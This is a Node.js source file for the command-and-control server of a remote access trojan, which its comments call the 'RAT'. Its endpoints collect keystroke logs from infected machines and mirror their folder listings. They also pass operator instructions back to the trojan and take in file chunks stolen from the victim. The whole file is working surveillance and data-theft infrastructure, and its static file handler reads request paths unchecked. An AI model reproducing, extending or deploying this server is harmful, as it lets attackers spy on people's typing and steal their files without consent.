//run 'node server.js' to run

const http = require('http');//needed for communication
const https = require('https');//needed for secure communication
const fs = require('fs');//File system
const path = require('path');//Path parser
const port = 1999;//port for the server

let keylog = [];//keylog buffr
let folders = { files: [], current_dir: [] };//Directory emulation
let mediastream;//media stream placeeholder
let dirman_instruction = undefined;//tmporary directory lookup instructions
let tempdetails = {}//tmporary file details

//404 page goes here
function notfoundpage(res, url) {
    res.writeHead(404);// 404 error message
    res.write('404, code: ' + url);
    console.error('File not found: ', url)
}

///Create server
const server = http.createServer(function (req, res) {
    //req = request, res = response

    //console.log('Request: ', req.url);

    res.setHeader('Acess-Control-Allow-Origin', '*');//allow access control from client, this will automatically handle most media files

    try {//server hits exit code if an error isnt handled

        switch (req.url) {//handle request

            case '/':
            case '/index.html'://requested url at the start of the site

                res.writeHead(200, { 'Content-type': 'text/html' });//200 ok
                fs.readFile('index.html', function (err, databuffer) {//read index.html file
                    if (err) {//error because file not found/inaccesible
                        notfoundpage(res, 'index');//show 404 page
                    } else {//File read successful
                        res.write(databuffer);//respond with data from file
                    }
                    res.end();//end response
                })

                break;

            case '/action/get/keylog'://send keylog as response

                res.writeHead(200, { 'Content-type': 'application/json' });
                res.write(JSON.stringify(keylog))
                res.end()

                break;

            case '/action/post/keylog'://receive keylog from Rat

                req.on('data', function (data) {
                    keylog = JSON.parse(data)
                    res.end()
                });

                break;

            case '/action/get/folders'://Reply folder data to control page

                res.writeHead(200, { 'Content-type': 'application/json' });
                res.end(JSON.stringify(folders))

                break;

            case '/action/post/folders'://receive folders from RAT as binary buffer

                req.on('data', function (data) {
                    folders = JSON.parse(data)
                    res.writeHead(200, { 'Content-type': 'application/json' });//200 ok
                    if (dirman_instruction != undefined) {
                        res.write(JSON.stringify(dirman_instruction))//Reply with instructions from control page
                        dirman_instruction = undefined;//reset instructions
                    }
                    res.end();
                });

                break;

            case '/action/post/folders/instruct'://receive folder instructions from Control page

                req.on('data', function (data) {
                    dirman_instruction = JSON.parse(data)
                    console.log('folder instruction data :', dirman_instruction)
                    res.writeHead(200, { 'Content-type': 'application/json' });//200 ok, response json data
                    res.end(JSON.stringify({ server: 'instruction received' }))
                });

                break;

            case '/action/post/file/buffer'://Multiple file chunks should arrive in quick sucession

                req.on('data', function (data) {
                    fs.appendFile(path.join('temp/', tempdetails.base), data, function (err) { if (err) { throw err; } })
                    res.end();
                });

                break;

            case '/action/post/file/info'://receive file data instructions before buffers are posted

                req.on('data', function (data) {
                    tempdetails = JSON.parse(data);//Incomming file details before buffers
                    var fpath = path.join('temp/', tempdetails.base)

                    if (!fs.existsSync('temp/')) {
                        fs.mkdirSync('temp/')//create folder
                    } else {
                        if (fs.existsSync(fpath)) { fs.unlink(fpath, function (err) { if (err) throw err; }) }//delete file if it already exists
                    }

                    console.log('Created file: ', fpath)
                    res.end();
                });

                break;

            case '/action/get/temp':
                try {
                    fs.readdir('temp/', function (err, files) {
                        if (err) { throw err };
                        console.log(files)
                        res.write(JSON.stringify(files))
                        res.end()
                    })
                } catch (err) {
                    console.log('couldn\'t read temp folder', err)
                }
                break;

            default://Request is for component of webpage

                if (req.url.indexOf('.css') != -1) {//requested url is a css file
                    res.setHeader('Content-type', 'text/css');//Set the header to css, so the client will expects a css document
                } else if (req.url.indexOf('.js') != -1) { //requested url is a js file
                    res.setHeader('Content-type', 'application/javascript');//Set the header to javascript, so the client will expects a javascript document
                } else if (req.url.indexOf('.html') != -1) {//requested url is a html file
                    res.setHeader('Content-type', 'text/html');//Set the header to html, so the client will expects a html document
                } else {
                    //media handled automatically
                }

                fs.readFile(req.url.replace('/', ''), function (err, data) {//read req.url.replace('/', '') file
                    if (err) {//error because file not found/inaccesible
                        notfoundpage(res, req.url);//show 404 page
                    } else {
                        res.writeHead(200);//200 ok
                        res.write(data);//respond with data from file
                    }
                    res.end();//end response
                })

        }

    }
    catch (err) {
        console.log('Error: ', err)
    }


}).listen(port, function (err) {//Listen to a port with server

    if (err) {
        console.error(err);
    } else {
        console.log('Listening on port: ', port);
    }

})
